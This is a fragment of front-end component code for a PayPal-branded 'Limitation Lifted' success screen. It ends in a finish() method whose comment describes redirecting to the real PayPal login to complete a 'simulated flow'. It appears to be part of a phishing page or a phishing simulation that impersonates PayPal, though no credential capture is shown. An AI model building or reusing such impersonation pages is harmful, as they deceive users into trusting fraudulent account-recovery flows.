      ...
      <div class="flex flex-col items-center text-center py-6 animate-in fade-in duration-500">
        ...
        <div class="bg-green-50 border border-green-100 rounded-lg p-4 mb-6 text-left w-full">
            <div class="flex items-start gap-3">
                 ...
                 <div>
                     <p class="text-sm font-bold text-[#2c2e2f] mb-1">Limitation Lifted</p>
                     <p class="text-xs text-[#5e6c75]">Your account access has been fully restored. You can now send, withdraw, and manage your funds securely.</p>
                 </div>
            </div>
        </div>
...
export class SuccessComponent {
  ...
  finish() {
    // Redirection to real PayPal login to complete the simulated flow
